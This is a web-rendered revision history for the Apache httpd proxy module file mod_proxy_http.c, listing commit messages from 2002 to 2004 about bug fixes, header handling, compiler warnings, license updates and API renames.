Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102525)

File length: 48388 byte(s)

Diff to [previous 102320](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102320&r2=102525)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102320&r2=102525&diff_format=h))
```
apply Apache License, Version 2.0

```

---

Revision [**102320**](/viewvc?view=revision&revision=102320) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102320&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102320&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102320))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102320)

Modified
*Tue Jan 13 16:11:55 2004 UTC*
(21 years ago)
by *martin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102320)

File length: 50607 byte(s)

Diff to [previous 102283](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102283&r2=102320)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102283&r2=102320&diff_format=h))
```
If the proxy was enabled, and UseCanonicalHostname was off,
then the Via: header would report not the proxy
hosts's ServerName (or any of its configured VHosts's names) as it
should, but the *origin hosts*'s name.
Now it reports its ServerName.

```

---

Revision [**102283**](/viewvc?view=revision&revision=102283) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102283&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102283&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102283))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102283)

Modified
*Mon Jan 12 14:08:08 2004 UTC*
(21 years ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102283)

File length: 49685 byte(s)

Diff to [previous 102282](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102282&r2=102283)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102282&r2=102283&diff_format=h))
```
* modules/proxy/proxy_http.c (ap_proxy_http_process_response): Handle
all 1xx interim responses the same, one of the two 2616 compliance
issues in PR 19442.

```

---

Revision [**102282**](/viewvc?view=revision&revision=102282) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102282&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102282&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102282))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102282)

Modified
*Mon Jan 12 13:06:39 2004 UTC*
(21 years ago)
by *martin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102282)

File length: 49881 byte(s)

Diff to [previous 102239](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102239&r2=102282)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102239&r2=102282&diff_format=h))
```
Cosmetic change (I dislike 'known-constant-minus-one' literal numbers):
The ap_is_HTTP_INFO() macro checks for values in the 100...199 range,
and is a better readable replacement for the value 199.

```

---

Revision [**102239**](/viewvc?view=revision&revision=102239) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102239&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102239&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102239))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102239)

Modified
*Fri Jan 9 03:04:41 2004 UTC*
(21 years ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102239)

File length: 49881 byte(s)

Diff to [previous 102135](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102135&r2=102239)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102135&r2=102239&diff_format=h))
```
mod_proxy hangs when both KeepAlive and ProxyErrorOverride are enabled,
and a non-200 response without a body is generated by the backend
server.

Submitted by: Graham Wiseman, Richard Reiner
Reviewed by: Richard Reiner, Bill Stoddard

```

---

Revision [**102135**](/viewvc?view=revision&revision=102135) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102135&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102135&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102135))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102135)

Modified
*Thu Jan 1 13:26:26 2004 UTC*
(21 years ago)
by *nd*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102135)

File length: 49565 byte(s)

Diff to [previous 102069](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102069&r2=102135)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102069&r2=102135&diff_format=h))
```
update license to 2004.

```

---

Revision [**102069**](/viewvc?view=revision&revision=102069) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102069&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102069&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102069))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102069)

Modified
*Mon Dec 15 23:04:40 2003 UTC*
(21 years, 1 month ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102069)

File length: 49565 byte(s)

Diff to [previous 102037](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102037&r2=102069)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102037&r2=102069&diff_format=h))
```
mod_proxy with ProxyErrorOverride On in a reverse-proxy configuration attaches
a body to the 302 response and a wrong Content-Length header.

PR: 22951
Submitted by:	Ermanno Scaglione <scaglione ..at.. starnetone.de>
Reviewed by:	Blaise Tarr <blaise.tarr .. at .. cnet.com>

```

---

Revision [**102037**](/viewvc?view=revision&revision=102037) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102037&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102037&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102037))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102037)

Modified
*Fri Dec 12 12:36:50 2003 UTC*
(21 years, 1 month ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102037)

File length: 49565 byte(s)

Diff to [previous 102017](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102017&r2=102037)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102017&r2=102037&diff_format=h))
```
Fix format string warnings from gcc on amd64:

* modules/ssl/ssl_scache_dbm.c (ssl_scache_dbm_store):
Print apr_size_t using APR_SIZE_T_FMT.

* modules/ssl/ssl_engine_io.c (ssl_filter_write): Print difference
between sizes using APR_SSIZE_T_FMT, apr_size_t using APR_SIZE_T_FMT.

* modules/proxy/proxy_http.c (ap_proxy_http_request): Print
apr_uint64_t using APR_UINT64_T_HEX_FMT.

```

---

Revision [**102017**](/viewvc?view=revision&revision=102017) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102017&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102017&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102017))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102017)

Modified
*Wed Dec 10 19:26:15 2003 UTC*
(21 years, 1 month ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102017)

File length: 49510 byte(s)

Diff to [previous 101516](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=101516&r2=102017)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=101516&r2=102017&diff_format=h))
```
Fix memory leak in handling of request bodies during reverse
proxy operations.

PR:      24991
Submitted by: Larry Toppi <larry.toppi citrix.com>
Reviewed by:  Jeff Trawick

```

---

Revision [**101516**](/viewvc?view=revision&revision=101516) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=101516&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=101516&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=101516))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=101516)

Modified
*Wed Oct 22 16:09:58 2003 UTC*
(21 years, 3 months ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=101516)

File length: 49491 byte(s)

Diff to [previous 101154](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=101154&r2=101516)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=101154&r2=101516&diff_format=h))
```
* proxy_http.c (ap_proxy_http_process_response): Send a valid
status-line even if the parsed status-line had no trailing spaces.
Remove the warning for this case as triggers for valid status-lines
too.

PR: 23998

```

---

Revision [**101154**](/viewvc?view=revision&revision=101154) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=101154&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=101154&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=101154))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=101154)

Modified
*Wed Sep 3 19:27:12 2003 UTC*
(21 years, 4 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=101154)

File length: 49468 byte(s)

Diff to [previous 99385](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=99385&r2=101154)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=99385&r2=101154&diff_format=h))
```
switch to APR 1.0 API (which is still in flux)

because of the changes to the argument lists of apr_mmap_dup and apr_socket_create,
2.1-dev won't build with apr and apr-util's 0.9 branch anymore

```

---

Revision [**99385**](/viewvc?view=revision&revision=99385) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=99385&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=99385&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=99385))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=99385)

Modified
*Wed Apr 16 06:30:15 2003 UTC*
(21 years, 9 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=99385)

File length: 49461 byte(s)

Diff to [previous 99369](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=99369&r2=99385)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=99369&r2=99385&diff_format=h))
```
Silence a compiler warning.

```

---

Revision [**99369**](/viewvc?view=revision&revision=99369) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=99369&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=99369&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=99369))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=99369)

Modified
*Tue Apr 15 16:39:12 2003 UTC*
(21 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=99369)

File length: 49454 byte(s)

Diff to [previous 99367](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=99367&r2=99369)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=99367&r2=99369&diff_format=h))
```
Clarify an error message
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**99367**](/viewvc?view=revision&revision=99367) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=99367&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=99367&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=99367))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=99367)

Modified
*Tue Apr 15 16:33:56 2003 UTC*
(21 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=99367)

File length: 49441 byte(s)

Diff to [previous 98573](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=98573&r2=99367)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=98573&r2=99367&diff_format=h))
```
Correct some indenting
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**98573**](/viewvc?view=revision&revision=98573) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=98573&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=98573&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=98573))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=98573)

Modified
*Mon Feb 3 17:53:28 2003 UTC*
(21 years, 11 months ago)
by *nd*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=98573)

File length: 49419 byte(s)

Diff to [previous 97812](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97812&r2=98573)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97812&r2=98573&diff_format=h))
```
finished that boring job:
update license to 2003.

Happy New Year! ;-))

```

---

Revision [**97812**](/viewvc?view=revision&revision=97812) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97812&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97812&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=97812))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=97812)

Modified
*Mon Dec 9 05:37:26 2002 UTC*
(22 years, 1 month ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=97812)

File length: 49419 byte(s)

Diff to [previous 97777](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97777&r2=97812)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97777&r2=97812&diff_format=h))
```
Rewrite how proxy sends its request to allow input bodies to morph the request
bodies.  Previously, if an input filter changed the request body, the
original C-L would be sent which would be incorrect.

Due to HTTP compliance, we must either send the body T-E: chunked or include
a C-L for the request body.  Connection: Close is not an option.

```

---

Revision [**97777**](/viewvc?view=revision&revision=97777) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97777&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97777&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=97777))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=97777)

Modified
*Thu Dec 5 03:49:45 2002 UTC*
(22 years, 1 month ago)
by *brianp*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=97777)

File length: 46495 byte(s)

Diff to [previous 97455](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97455&r2=97777)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97455&r2=97777&diff_format=h))
```
mod_proxy: Don't remove the Content-Length from responses

```

---

Revision [**97455**](/viewvc?view=revision&revision=97455) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97455&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97455&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=97455))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=97455)

Modified
*Fri Nov 8 09:24:00 2002 UTC*
(22 years, 2 months ago)
by *brianp*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=97455)

File length: 46728 byte(s)

Diff to [previous 97305](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97305&r2=97455)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=97305&r2=97455&diff_format=h))
```
When doing a GET of a proxied URL as a subrequest within
a POSTed request, don't send the original POST's Content-Length
as part of the header for the GET.

```

---

Revision [**97305**](/viewvc?view=revision&revision=97305) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97305&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=97305&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=97305))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=97305)

Modified
*Fri Oct 25 20:58:55 2002 UTC*
(22 years, 3 months ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=97305)

File length: 45711 byte(s)

Diff to [previous 96983](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96983&r2=97305)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96983&r2=97305&diff_format=h))
```
Fix a segfault when the client closes the connection prematurely.

Reported by: Fabio Wakim Trentini
Reviewed by: Bill Stoddard

```

---

Revision [**96983**](/viewvc?view=revision&revision=96983) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96983&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96983&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=96983))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=96983)

Modified
*Thu Sep 26 11:35:47 2002 UTC*
(22 years, 4 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=96983)

File length: 45710 byte(s)

Diff to [previous 96982](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96982&r2=96983)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96982&r2=96983&diff_format=h))
```
add some parens to quiet a gcc warning:

proxy_http.c:866: warning: suggest parentheses around assignment used as truth value

```

---

Revision [**96982**](/viewvc?view=revision&revision=96982) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96982&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96982&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=96982))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=96982)

Modified
*Thu Sep 26 08:55:28 2002 UTC*
(22 years, 4 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=96982)

File length: 45708 byte(s)

Diff to [previous 96484](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96484&r2=96982)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96484&r2=96982&diff_format=h))
```
Make sure the contents of the WWW-Authenticate header is
passed on a 4xx error by proxy. Previously all headers
were dropped, resulting in the browser being unable to
authenticate.
PR:
Obtained from:
Submitted by:	Dr Richard Reiner <rreiner@fscinternet.com>, Richard Danielli <rdanielli@fscinternet.com>, Graham Wiseman <gwiseman@fscinternet.com>, David Henderson <dhenderson@fscinternet.com>
Reviewed by:	Graham Leggett

```

---

Revision [**96484**](/viewvc?view=revision&revision=96484) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96484&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96484&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=96484))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=96484)

Modified
*Thu Aug 22 15:02:49 2002 UTC*
(22 years, 5 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=96484)

File length: 45231 byte(s)

Diff to [previous 96469](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96469&r2=96484)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96469&r2=96484&diff_format=h))
```
Add A warning when servers don't set their status line
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**96469**](/viewvc?view=revision&revision=96469) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96469&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96469&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=96469))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=96469)

Modified
*Wed Aug 21 16:01:15 2002 UTC*
(22 years, 5 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=96469)

File length: 44917 byte(s)

Diff to [previous 96320](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96320&r2=96469)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96320&r2=96469&diff_format=h))
```
fix the case when a server doesn't send a response string

Submitted by:	Brett Hutley <brett@hutley.net> J.D. Silvester <jsilves@uwo.ca>

```

---

Revision [**96320**](/viewvc?view=revision&revision=96320) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96320&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96320&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=96320))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=96320)

Modified
*Thu Aug 8 17:59:18 2002 UTC*
(22 years, 5 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=96320)

File length: 44858 byte(s)

Diff to [previous 96055](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96055&r2=96320)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=96055&r2=96320&diff_format=h))
```
Fix proxy so that it is possible to access ftp: URLs via a proxy
chain.
PR:
Obtained from:
Submitted by:	Peter Van Biesen <peter.vanbiesen@vlafo.be>
Reviewed by:	Graham Leggett <minfrin@apache.org>

```

---

Revision [**96055**](/viewvc?view=revision&revision=96055) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96055&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=96055&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=96055))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=96055)

Modified
*Mon Jul 15 07:46:19 2002 UTC*
(22 years, 6 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=96055)

File length: 44785 byte(s)

Diff to [previous 95966](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95966&r2=96055)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95966&r2=96055&diff_format=h))
```

  Timeout/time fixes

```

---

Revision [**95966**](/viewvc?view=revision&revision=95966) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95966&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95966&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95966))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95966)

Modified
*Sat Jul 6 20:04:38 2002 UTC*
(22 years, 6 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95966)

File length: 44821 byte(s)

Diff to [previous 95891](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95891&r2=95966)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95891&r2=95966&diff_format=h))
```
Renames Pending:
 This clears the list of renames pending in apr-util.
 Parts of this list was alreadu done, but the pending list hadn't been updated.

 apr_hook_debug_current     from apr_current_hooking_module
 apr_hook_debug_show        from apr_show_hook

 apr_hook_global_pool       from apr_global_hook_pool
 apr_hook_sort_all          from apr_sort_hooks

 apr_uri_port_of_scheme     from apr_uri_default_port_for_scheme
 apr_uri_unparse            from apr_uri_unparse_components
 apr_uri_parse              from apr_uri_parse_components
 apr_uri_parse_hostinfo     from apr_uri_parse_hostinfo_components

 apr_uri_t                  from apr_uri_components

 All APR_URI_*              from all APU_URI_* symbols
 All APR_UNP_*              from all UNP_* symbols

PR:
Obtained from:
Submitted by:	 Thom May
Reviewed by:

```

---

Revision [**95891**](/viewvc?view=revision&revision=95891) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95891&view=markup))
